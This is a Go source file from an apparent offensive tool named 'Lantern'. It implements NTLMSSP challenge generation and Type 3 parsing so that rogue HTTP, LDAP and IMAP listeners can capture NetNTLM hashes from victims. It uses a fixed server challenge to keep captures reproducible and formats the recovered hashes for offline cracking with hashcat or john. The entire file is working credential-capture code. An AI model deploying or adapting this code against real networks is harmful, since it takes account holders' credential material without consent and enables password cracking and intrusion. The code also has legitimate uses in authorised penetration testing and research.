// Package ntlm implements the small subset of NTLMSSP needed to capture
// NetNTLM hashes from clients: it emits a Type 2 challenge and parses the
// Type 3 authenticate message returned by the victim. It is shared by every
// Lantern listener that offers NTLM authentication (HTTP, LDAP, IMAP, ...).
package ntlm

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"unicode/utf16"
)

// Signature is the NTLMSSP message signature including its trailing null byte.
var Signature = []byte("NTLMSSP\x00")

// DefaultChallenge is the fixed 8-byte server challenge Lantern hands out. A
// static value keeps captured hashes reproducible and matches the challenge
// embedded in the hashes the listeners report.
var DefaultChallenge = []byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08}

// TargetName is advertised in the Type 2 message as the authentication target.
const TargetName = "LANTERN"

const (
	negotiateUnicode     = 0x00000001
	negotiateOEM         = 0x00000002
	requestTarget        = 0x00000004
	negotiateNTLM        = 0x00000200
	negotiateAlwaysSign  = 0x00008000
	negotiateExtendedSec = 0x00080000
	negotiateTargetInfo  = 0x00800000
	negotiateVersion     = 0x02000000
	negotiate128         = 0x20000000
	negotiate56          = 0x80000000
)

// MessageType returns the NTLMSSP message type (1, 2 or 3) found anywhere in
// data, along with the offset at which the NTLMSSP signature begins.
func MessageType(data []byte) (msgType uint32, offset int, ok bool) {
	idx := bytes.Index(data, Signature)
	if idx < 0 || idx+12 > len(data) {
		return 0, 0, false
	}
	return binary.LittleEndian.Uint32(data[idx+8 : idx+12]), idx, true
}

// Type1Flags returns the negotiate flags carried by a Type 1 message.
func Type1Flags(data []byte) (uint32, bool) {
	msgType, idx, ok := MessageType(data)
	if !ok || msgType != 1 || idx+16 > len(data) {
		return 0, false
	}
	return binary.LittleEndian.Uint32(data[idx+12 : idx+16]), true
}

// BuildType2 builds an NTLMSSP CHALLENGE message. clientFlags are the flags
// advertised by the client's Type 1 message (0 if unknown); challenge is the
// 8-byte server challenge (DefaultChallenge is used when nil or wrong length).
func BuildType2(clientFlags uint32, challenge []byte) []byte {
	if len(challenge) != 8 {
		challenge = DefaultChallenge
	}

	flags := uint32(negotiateUnicode | requestTarget | negotiateNTLM | negotiateAlwaysSign |
		negotiateExtendedSec | negotiateTargetInfo | negotiateVersion | negotiate128 | negotiate56)
	if clientFlags != 0 {
		flags &= clientFlags | negotiateTargetInfo
		flags |= negotiateTargetInfo
	}
	if flags&negotiateUnicode == 0 && clientFlags&negotiateOEM != 0 {
		flags |= negotiateOEM
	}
	includeVersion := flags&negotiateVersion != 0
	headerLength := 56

	targetNameBytes := []byte(TargetName)
	if flags&negotiateUnicode != 0 {
		targetNameBytes = EncodeUTF16LE(TargetName)
	}

	targetInfo := avPair(2, EncodeUTF16LE(TargetName))                            // NetBIOS domain
	targetInfo = append(targetInfo, avPair(1, EncodeUTF16LE(TargetName))...)      // NetBIOS computer
	targetInfo = append(targetInfo, avPair(3, EncodeUTF16LE("lantern.local"))...) // DNS computer
	targetInfo = append(targetInfo, avPair(4, EncodeUTF16LE("local"))...)         // DNS domain
	targetInfo = append(targetInfo, 0x00, 0x00, 0x00, 0x00)                       // AV EOL

	msg := make([]byte, headerLength+len(targetNameBytes)+len(targetInfo))
	copy(msg[0:8], Signature)
	binary.LittleEndian.PutUint32(msg[8:12], 2)

	binary.LittleEndian.PutUint16(msg[12:14], uint16(len(targetNameBytes)))
	binary.LittleEndian.PutUint16(msg[14:16], uint16(len(targetNameBytes)))
	binary.LittleEndian.PutUint32(msg[16:20], uint32(headerLength))

	binary.LittleEndian.PutUint32(msg[20:24], flags)
	copy(msg[24:32], challenge)

	targetInfoOffset := headerLength + len(targetNameBytes)
	binary.LittleEndian.PutUint16(msg[40:42], uint16(len(targetInfo)))
	binary.LittleEndian.PutUint16(msg[42:44], uint16(len(targetInfo)))
	binary.LittleEndian.PutUint32(msg[44:48], uint32(targetInfoOffset))

	if includeVersion {
		copy(msg[48:56], []byte{0x06, 0x01, 0xb1, 0x1d, 0x00, 0x00, 0x00, 0x0f})
	}

	copy(msg[headerLength:targetInfoOffset], targetNameBytes)
	copy(msg[targetInfoOffset:], targetInfo)
	return msg
}

func avPair(id uint16, value []byte) []byte {
	pair := make([]byte, 4+len(value))
	binary.LittleEndian.PutUint16(pair[0:2], id)
	binary.LittleEndian.PutUint16(pair[2:4], uint16(len(value)))
	copy(pair[4:], value)
	return pair
}

// Identity holds the account fields recovered from a Type 3 message together
// with the formatted NetNTLM hash suitable for hashcat/john.
type Identity struct {
	Domain      string
	Username    string
	Workstation string
	Version     int    // 1 or 2
	Hash        string // full NetNTLMv1/v2 line, or "" when unavailable
}

// Display returns DOMAIN\user, or \user when the domain is empty.
func (i Identity) Display() string {
	if i.Domain != "" {
		return i.Domain + "\\" + i.Username
	}
	return "\\" + i.Username
}

// ParseType3 extracts the identity and NetNTLM hash from an NTLMSSP Type 3
// message located anywhere in data. challenge is the 8-byte server challenge
// previously sent so the formatted hash is crackable.
func ParseType3(data []byte, challenge []byte) (Identity, bool) {
	var id Identity
	msgType, idx, ok := MessageType(data)
	if !ok || msgType != 3 {
		return id, false
	}
	msg := data[idx:]
	if len(msg) < 52 {
		return id, false
	}

	flags := uint32(0)
	if len(msg) >= 64 {
		flags = binary.LittleEndian.Uint32(msg[60:64])
	}

	readField := func(off int) []byte {
		if off+8 > len(msg) {
			return nil
		}
		length := int(binary.LittleEndian.Uint16(msg[off : off+2]))
		start := int(binary.LittleEndian.Uint32(msg[off+4 : off+8]))
		if length <= 0 || start < 0 || start+length > len(msg) {
			return nil
		}
		return msg[start : start+length]
	}

	decodeStr := func(raw []byte) string {
		if raw == nil {
			return ""
		}
		if flags&negotiateUnicode == 0 {
			return string(bytes.TrimRight(raw, "\x00"))
		}
		return DecodeUTF16LE(raw)
	}

	lmResponse := readField(12)
	ntResponse := readField(20)
	id.Domain = decodeStr(readField(28))
	id.Username = decodeStr(readField(36))
	id.Workstation = decodeStr(readField(44))

	if len(challenge) != 8 {
		challenge = DefaultChallenge
	}
	challengeHex := hex.EncodeToString(challenge)

	switch {
	case len(ntResponse) > 24:
		id.Version = 2
		id.Hash = fmt.Sprintf("%s::%s:%s:%s:%s",
			id.Username, id.Domain, challengeHex,
			hex.EncodeToString(ntResponse[:16]),
			hex.EncodeToString(ntResponse[16:]))
	case len(ntResponse) == 24:
		id.Version = 1
		id.Hash = fmt.Sprintf("%s::%s:%s:%s:%s",
			id.Username, id.Domain,
			hex.EncodeToString(lmResponse),
			hex.EncodeToString(ntResponse),
			challengeHex)
	}
	return id, true
}

// EncodeUTF16LE returns the UTF-16 little-endian encoding of value.
func EncodeUTF16LE(value string) []byte {
	units := utf16.Encode([]rune(value))
	encoded := make([]byte, len(units)*2)
	for i, unit := range units {
		binary.LittleEndian.PutUint16(encoded[i*2:i*2+2], unit)
	}
	return encoded
}

// DecodeUTF16LE decodes UTF-16 little-endian bytes, dropping embedded nulls.
func DecodeUTF16LE(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	units := make([]uint16, 0, len(b)/2)
	for i := 0; i+1 < len(b); i += 2 {
		units = append(units, binary.LittleEndian.Uint16(b[i:i+2]))
	}
	runes := utf16.Decode(units)
	cleaned := make([]rune, 0, len(runes))
	for _, r := range runes {
		if r != 0 {
			cleaned = append(cleaned, r)
		}
	}
	return string(cleaned)
}
